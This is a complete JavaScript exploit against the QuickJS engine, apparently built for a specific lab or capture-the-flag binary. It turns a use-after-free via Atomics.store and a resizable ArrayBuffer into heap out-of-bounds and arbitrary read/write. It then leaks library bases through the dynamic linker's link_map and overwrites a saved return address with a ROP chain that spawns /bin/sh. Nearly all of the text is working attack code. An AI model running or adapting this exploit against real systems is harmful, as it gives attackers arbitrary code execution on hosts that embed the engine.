// exec-shell-relro exploit for QuickJS
//
// Primitive chain:
//  1) Atomics.store() + ResizableArrayBuffer -> UAF write into JSArrayBuffer struct
//  2) Corrupt victim ArrayBuffer byte_length to get heap OOB read/write
//  3) Use heap OOB to point a probe ArrayBuffer at arbitrary addresses (AAR)
//  4) Parse _DYNAMIC[DT_DEBUG] -> r_debug -> link_map to leak libc/ld bases (no /proc)
//  5) Read __libc_stack_end from ld, scan stack for eval_file() return address
//  6) Overwrite that return address with a ROP chain calling execve("/bin/sh", argv, envp)

function die(msg) { throw new Error(msg); }

// ---------------- Stage A: create OOB ArrayBuffer (victim) ----------------

let rab = new ArrayBuffer(0x30, { maxByteLength: 0x4000 });
let ta = new BigInt64Array(rab);

// Block chunk after rab backing store so realloc on grow must move.
let block = new ArrayBuffer(0x1000);

let victim;

const OOB_LEN = 0x400000; // 4MB logical length (we'll only access mapped pages)
// Store [byte_length=OOB_LEN, max_byte_length=-1] into victim's JSArrayBuffer struct.
let combined = (0xffffffffn << 32n) | BigInt(OOB_LEN);
let signedCombined = combined - (1n << 64n);

let evil = {
  valueOf() {
    // Force rab backing store realloc+move, freeing the old 0x40-sized chunk.
    rab.resize(0x2000);
    // Reuse freed 0x40 chunk as JSArrayBuffer struct for this new ArrayBuffer.
    victim = new ArrayBuffer(0x20);
    return signedCombined;
  }
};

Atomics.store(ta, 0, evil);

// Extend heap so OOB scans stay in mapped pages.
let filler = new ArrayBuffer(0x600000);

let mem = new Uint8Array(victim);
let dv = new DataView(victim);

// ---------------- Stage B: find probe JSArrayBuffer struct inside victim OOB ----------------

const PROBE_LEN = 0x1234;
let probe = new ArrayBuffer(PROBE_LEN);
let probeU8 = new Uint8Array(probe);
let marker = [0x4d,0x41,0x47,0x49,0x43,0x21,0x21,0x21]; // MAGIC!!!
for (let i = 0; i < marker.length; i++) probeU8[i] = marker[i];
for (let i = marker.length; i < 0x40; i++) probeU8[i] = 0x41;

const SCAN_LIMIT = 0x300000;

function findMarkerOff() {
  for (let i = 0; i < SCAN_LIMIT - 0x40; i++) {
    let ok = true;
    for (let j = 0; j < marker.length; j++) {
      if (mem[i + j] !== marker[j]) { ok = false; break; }
    }
    if (ok) return i;
  }
  return -1;
}

let probeStoreOff = findMarkerOff();
if (probeStoreOff < 0) die('marker not found');

let probeStructOff = -1;
let heapBase = 0n;
let probeStorePtr = 0n;

for (let off = 0; off < SCAN_LIMIT - 0x60; off += 4) {
  if (dv.getInt32(off, true) !== PROBE_LEN) continue;
  if (dv.getInt32(off + 4, true) !== -1) continue;
  if (mem[off + 8] !== 0 || mem[off + 9] !== 0) continue;
  probeStorePtr = dv.getBigUint64(off + 16, true);
  heapBase = probeStorePtr - BigInt(probeStoreOff);
  probeStructOff = off;
  break;
}
if (probeStructOff < 0) die('probe JSArrayBuffer struct not found');

function oobWriteI32(off, v) { dv.setInt32(off, v, true); }
function oobWriteU64(off, v) { dv.setBigUint64(off, v, true); }
function oobReadU64(off) { return dv.getBigUint64(off, true); }

// Leak qjs PIE base from probe->free_func == js_array_buffer_free.
const js_array_buffer_free_off = 0x14bc0n;
let freeFuncPtr = oobReadU64(probeStructOff + 48);
let pieBase = freeFuncPtr - js_array_buffer_free_off;

// AAR using probe ArrayBuffer (point its data pointer at arbitrary address).
function absReadU64(addr) {
  oobWriteU64(probeStructOff + 16, addr);
  oobWriteI32(probeStructOff + 0, 0x1000);
  oobWriteU64(probeStructOff + 48, 0n); // don't free arbitrary pointers
  return (new BigUint64Array(probe))[0];
}

function absReadCString(addr, maxLen) {
  oobWriteU64(probeStructOff + 16, addr);
  oobWriteI32(probeStructOff + 0, maxLen);
  oobWriteU64(probeStructOff + 48, 0n);
  let u8 = new Uint8Array(probe);
  let s = '';
  for (let i = 0; i < maxLen; i++) {
    let c = u8[i];
    if (c === 0) break;
    s += String.fromCharCode(c);
  }
  return s;
}

// ---------------- Stage C: DT_DEBUG -> link_map to leak libc + ld bases ----------------

const DYNAMIC_OFF = 0x10ba00n; // _DYNAMIC symbol offset in this qjs build
let dyn = pieBase + DYNAMIC_OFF;

let r_debug = 0n;
for (let i = 0; i < 0x400; i++) {
  let tag = BigInt.asIntN(64, absReadU64(dyn + BigInt(i * 16)));
  let val = absReadU64(dyn + BigInt(i * 16 + 8));
  if (tag === 0n) break;
  if (tag === 21n) { // DT_DEBUG
    r_debug = val;
    break;
  }
}
if (r_debug === 0n) die('DT_DEBUG not found');

let r_map = absReadU64(r_debug + 8n); // struct r_debug: r_map at +8
if (r_map === 0n) die('r_map is NULL');

let libcBase = 0n;
let ldBase = 0n;
let lm = r_map;
for (let n = 0; n < 32; n++) {
  let l_addr = absReadU64(lm + 0n);
  let l_name_ptr = absReadU64(lm + 8n);
  let name = absReadCString(l_name_ptr, 128);
  if (name.indexOf('/libc.so.6') !== -1) libcBase = l_addr;
  if (name.indexOf('ld-linux') !== -1) ldBase = l_addr;
  lm = absReadU64(lm + 24n); // l_next
  if (lm === 0n) break;
}
if (libcBase === 0n) die('libc base not found in link_map');
if (ldBase === 0n) die('ld base not found in link_map');

// ---------------- Stage D: leak stack top, find eval_file return address, write ROP ----------------

const __libc_stack_end_off = 0x35a20n; // in ld-linux-x86-64.so.2
let stackEnd = absReadU64(ldBase + __libc_stack_end_off);
if (stackEnd === 0n) die('__libc_stack_end is NULL');

// Return address (in main) right after call eval_file for script.
const ret_after_eval_file_off = 0x1350bn;
let targetRet = pieBase + ret_after_eval_file_off;

// Scan stack range [stackEnd-STACK_SCAN, stackEnd).
const STACK_SCAN = 0x400000n; // 4MB
let stackBase = stackEnd - STACK_SCAN;

// Re-point probe buffer to stack region.
oobWriteU64(probeStructOff + 16, stackBase);
oobWriteI32(probeStructOff + 0, Number(STACK_SCAN));
oobWriteU64(probeStructOff + 48, 0n);
let stackView = new BigUint64Array(probe);

// There can be multiple copies of targetRet in the upper stack (argv/envp/etc).
// The *actual* saved RIP used by eval_file() is the last occurrence.
let retIndex = -1;
for (let i = stackView.length - 1; i >= 0; i--) {
  if (stackView[i] === targetRet) { retIndex = i; break; }
}
if (retIndex < 0) die('target return address not found on stack');

// ROP gadgets / targets.
const g_ret = pieBase + 0x11016n;
const g_pop_rdi = pieBase + 0x1304en;
const g_pop_rsi = pieBase + 0x13bb5n;
const plt_execve = pieBase + 0x11410n;

// libc gadget: mov eax, ebx ; pop rdx ; pop rbx ; ret
const g_pop_rdx_pop_rbx = libcBase + 0x10da70n;

// libc string "/bin/sh\0"
const binsh = libcBase + 0x1a7ea4n;

// argv + envp arrays on stack after the chain.
let argvIndex = retIndex + 10;
let envpIndex = retIndex + 12;
let argvAddr = stackBase + BigInt(argvIndex * 8);
let envpAddr = stackBase + BigInt(envpIndex * 8);

// Overwrite the eval_file() saved return address with our ROP chain.
let w = retIndex;
stackView[w + 0] = g_ret;
stackView[w + 1] = g_pop_rdi;
stackView[w + 2] = binsh;
stackView[w + 3] = g_pop_rsi;
stackView[w + 4] = argvAddr;
stackView[w + 5] = g_pop_rdx_pop_rbx;
stackView[w + 6] = envpAddr;
stackView[w + 7] = 0n;         // dummy rbx
stackView[w + 8] = plt_execve;
stackView[w + 9] = g_ret;      // shouldn't return

// argv = ["/bin/sh", NULL]
stackView[argvIndex + 0] = binsh;
stackView[argvIndex + 1] = 0n;

// envp = [NULL]
stackView[envpIndex + 0] = 0n;

// Script ends; eval_file returns and the ROP chain execve()'s /bin/sh.
